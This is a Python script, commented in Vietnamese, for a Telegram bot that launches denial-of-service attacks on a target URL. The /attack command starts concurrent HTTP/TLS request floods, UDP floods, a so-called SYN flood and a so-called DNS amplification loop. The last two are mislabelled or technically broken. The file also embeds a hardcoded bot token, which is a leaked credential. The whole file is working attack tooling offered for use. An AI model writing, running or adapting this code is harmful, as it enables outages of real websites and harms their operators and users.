import threading
import aiohttp
import asyncio
import sys
import time
import os
import random
import ssl
import socket
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Danh sách User-Agent để tránh bị chặn
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
]

# Tạo kết nối SSL để bypass firewall
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

headers = {
    "User-Agent": random.choice(user_agents),
    "Connection": "keep-alive"  # Giữ kết nối mở để tạo tải cao hơn
}

so_request = 0
lock = threading.Lock()

# Biến toàn cục để lưu trạng thái tấn công
attack_status = {
    "tls_flood": False,
    "udp_flood": False,
    "syn_flood": False,
    "dns_amplification": False
}
target_info = {"url": None, "ip": None, "port": None, "dns_server": "8.8.8.8"}

# Hàm phân giải tên miền thành IP
def resolve_domain_to_ip(url):
    try:
        # Loại bỏ "http://" hoặc "https://" và đường dẫn
        domain = url.split("//")[-1].split("/")[0]
        # Phân giải tên miền thành IP
        ip = socket.gethostbyname(domain)
        return ip
    except Exception as e:
        print(f"Lỗi khi phân giải tên miền: {e}")
        return None

# Hàm tấn công TLS Flood
async def attack_tls_flood(session, url):
    """Tấn công TLS bằng cách giữ kết nối mở"""
    global so_request
    while attack_status["tls_flood"]:
        try:
            method = random.choice(["GET", "POST"])
            data = {"data": random.randint(1, 100000)} if method == "POST" else None
            
            # Tăng thời gian chờ kết nối lên 30 giây
            timeout = aiohttp.ClientTimeout(total=30)
            async with session.request(method, url, headers=headers, data=data, ssl=ssl_context, timeout=timeout) as response:
                with lock:
                    if response.status == 200:
                        so_request += 1

                sys.stdout.write(
                    f"Số request: {so_request} | Mã phản hồi: {response.status} | Method: {method} | TLS Flood\r"
                )
                sys.stdout.flush()
        except Exception as e:
            print(f"Lỗi TLS Flood: {e}")

# Hàm tấn công UDP Flood
def udp_flood(target_ip, target_port):
    """Tấn công UDP Flood bằng cách gửi các gói tin UDP liên tục"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65507)  # Tăng kích thước gói tin lên tối đa 65507 byte

    while attack_status["udp_flood"]:
        try:
            sock.sendto(bytes, (target_ip, target_port))
            print(f"Gửi gói tin UDP đến {target_ip}:{target_port}")
        except Exception as e:
            print(f"Lỗi khi gửi gói tin UDP: {e}")

# Hàm tấn công SYN Flood
def syn_flood(target_ip, target_port):
    """Tấn công SYN Flood bằng cách gửi các gói tin SYN giả mạo"""
    while attack_status["syn_flood"]:
        try:
            # Tạo socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            # Tạo gói tin TCP giả mạo
            packet = random._urandom(1024)  # Gói tin ngẫu nhiên
            sock.sendto(packet, (target_ip, target_port))
            print(f"Gửi gói tin SYN đến {target_ip}:{target_port}")
        except Exception as e:
            print(f"Lỗi khi gửi gói tin SYN: {e}")

# Hàm tấn công DNS Amplification
def dns_amplification(target_ip, dns_server):
    """Tấn công DNS Amplification bằng cách gửi yêu cầu DNS giả mạo"""
    while attack_status["dns_amplification"]:
        try:
            # Tạo socket UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Tạo yêu cầu DNS giả mạo
            dns_query = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
            sock.sendto(dns_query, (dns_server, 53))
            print(f"Gửi yêu cầu DNS đến {dns_server} | Đích: {target_ip}")
        except Exception as e:
            print(f"Lỗi khi gửi yêu cầu DNS: {e}")

# Hàm xử lý lệnh /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Chào mừng bạn đến với Bot Tấn Công!\n"
        "Các lệnh có sẵn:\n"
        "/attack <url> - Bắt đầu tấn công\n"
        "/stop - Dừng tất cả cuộc tấn công"
    )

# Hàm xử lý lệnh /attack
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_status, target_info
    if len(context.args) < 1:
        await update.message.reply_text("Vui lòng nhập URL: /attack <url>")
        return

    url = context.args[0]

    # Kiểm tra URL
    if not (url.startswith("http://") or url.startswith("https://")):
        url = "https://" + url

    # Phân giải tên miền thành IP
    target_ip = resolve_domain_to_ip(url)
    if not target_ip:
        await update.message.reply_text("Không thể phân giải tên miền thành IP.")
        return

    # Xác định cổng dựa trên giao thức
    target_port = 80 if url.startswith("http://") else 443

    # Lưu thông tin mục tiêu
    target_info["url"] = url
    target_info["ip"] = target_ip
    target_info["port"] = target_port

    # Bắt đầu tấn công TLS Flood
    attack_status["tls_flood"] = True
    await update.message.reply_text(f"Bắt đầu tấn công TLS Flood đến {url}")

    # Bắt đầu tấn công UDP Flood
    attack_status["udp_flood"] = True
    await update.message.reply_text(f"Bắt đầu tấn công UDP Flood đến {target_ip}:{target_port}")

    # Bắt đầu tấn công SYN Flood
    attack_status["syn_flood"] = True
    await update.message.reply_text(f"Bắt đầu tấn công SYN Flood đến {target_ip}:{target_port}")

    # Bắt đầu tấn công DNS Amplification
    attack_status["dns_amplification"] = True
    await update.message.reply_text(f"Bắt đầu tấn công DNS Amplification đến {target_ip}")

    # Tạo luồng cho TLS Flood
    async def run_tls_flood():
        async with aiohttp.ClientSession() as session:
            await attack_tls_flood(session, url)

    tls_thread = threading.Thread(target=asyncio.run, args=(run_tls_flood(),))
    tls_thread.start()

    # Tạo luồng cho UDP Flood
    udp_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port))
    udp_thread.start()

    # Tạo luồng cho SYN Flood
    syn_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port))
    syn_thread.start()

    # Tạo luồng cho DNS Amplification
    dns_thread = threading.Thread(target=dns_amplification, args=(target_ip, target_info["dns_server"]))
    dns_thread.start()

# Hàm xử lý lệnh /stop
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_status
    attack_status["tls_flood"] = False
    attack_status["udp_flood"] = False
    attack_status["syn_flood"] = False
    attack_status["dns_amplification"] = False
    await update.message.reply_text("Đã dừng tất cả cuộc tấn công.")

# Hàm chính để chạy bot
def main():
    # Thay thế 'YOUR_TELEGRAM_BOT_TOKEN' bằng token của bạn
    application = Application.builder().token("7815604030:AAELtDIikq3XylIwzwITArq-kjrFP6EFwsM").build()

    # Đăng ký các lệnh
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))

    # Chạy bot
    application.run_polling()

if __name__ == "__main__":
    main()